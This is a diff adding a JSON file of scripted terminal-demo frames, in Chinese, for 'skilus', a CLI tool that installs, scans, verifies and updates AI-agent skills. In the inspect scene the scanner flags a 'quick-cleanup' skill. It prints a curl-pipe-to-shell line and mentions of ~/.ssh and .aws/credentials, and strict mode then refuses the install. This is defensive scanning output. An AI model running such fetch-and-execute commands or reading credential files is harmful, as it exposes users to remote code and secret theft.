@@ -1,0 +1,350 @@
+{
+ "lang": "zh",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 还有 7 个</span>",
+      "<span class=\"d\">  已勾选 19 / 19 个</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 还有 7 个</span>",
+      "<span class=\"d\">  已勾选 0 / 19 个</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"d\">筛选：</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  5 / 19 个匹配 · 已勾选 0 个</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"d\">筛选：</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 个匹配 · 已勾选 0 个</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"d\">筛选：</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 个匹配 · 已勾选 0 个</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"d\">筛选：</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 个匹配 · 已勾选 1 个</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span> pdf",
+      "<span class=\"b\">安装到哪些智能体？</span>",
+      "<span class=\"d\">↑↓ 移动 · 空格 勾选 · → 全选 · ← 全不选 · 输入以筛选 · 回车 确认</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  已安装 2 个，共 74 个智能体 · 其他的用 --agent &lt;id&gt;（列表见 skilus agent…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span> pdf",
+      "<span class=\"b\">安装到哪些智能体？</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 个技能",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 个文件 · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: 可执行文件；请用 allow: [scripts]",
+      "    接受 <span class=\"d\">[executable]</span>",
+      "",
+      "目标目录： .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 个技能 · 0 个阻止项 · <span class=\"y\">1 个警告</span>",
+      "是否安装？[y/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 个技能",
+      "",
+      "<span class=\"b\">要安装哪些技能？</span> pdf",
+      "<span class=\"b\">安装到哪些智能体？</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 个技能",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 个文件 · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: 可执行文件；请用 allow: [scripts]",
+      "    接受 <span class=\"d\">[executable]</span>",
+      "",
+      "目标目录： .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 个技能 · 0 个阻止项 · <span class=\"y\">1 个警告</span>",
+      "是否安装？[y/N] y",
+      "",
+      "已将 pdf（32cdced3a21a）安装到 2 个目标目录。"
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 个技能",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 个文件 · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: 提及凭据: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 可执行文件；请用 allow: [scripts] 接受 <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 下载并执行代码: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 提及凭据: .aws/credentials <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 个技能 · 0 个阻止项 · <span class=\"y\">4 个警告</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 个技能",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 个文件 · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: 提及凭据: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 可执行文件；请用 allow: [scripts] 接受 <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 下载并执行代码: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 提及凭据: .aws/credentials <span class=\"d\">[credential-access]</span>",
+      "",
+      "目标目录： .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 个技能 · 0 个阻止项 · <span class=\"y\">4 个警告</span>",
+      "skilus: quick-cleanup: 在 --strict 下有 4 个警告: 被检查拒绝"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "已更改 pdf（project，claude-code）位于 ~/acme-app/.claude/skills/pdf",
+      "  已修改: SKILL.md",
+      "运行 skilus sync 进行恢复（如果你手动修改过，请加 --force）。"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "已替换 pdf 于 ~/acme-app/.claude/skills/pdf",
+      "已同步：安装 0 个，替换 1 个，5 个无变化。"
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "一切正常：6 个目标目录中的 3 个技能与锁文件一致。"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "技能         范围       REF     已安装           最新            状态",
+      "changelog  project  （默认分支）  9563a12b25b5  1b288cd0c1c1  有新版本",
+      "pdf        project  （默认分支）  dbd4588f9e10  dbd4588f9e10  最新",
+      "review     project  （默认分支）  9563a12b25b5  1b288cd0c1c1  有新版本"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> 没有发现问题",
+      "",
+      "1 个技能 · 0 个阻止项 · 0 个警告",
+      "是否更新？[y/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> 没有发现问题",
+      "",
+      "1 个技能 · 0 个阻止项 · 0 个警告",
+      "是否更新？[y/N] y",
+      "",
+      "已将 review 更新到 1b288cd0c1c1（1c92660a3b6f）。"
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
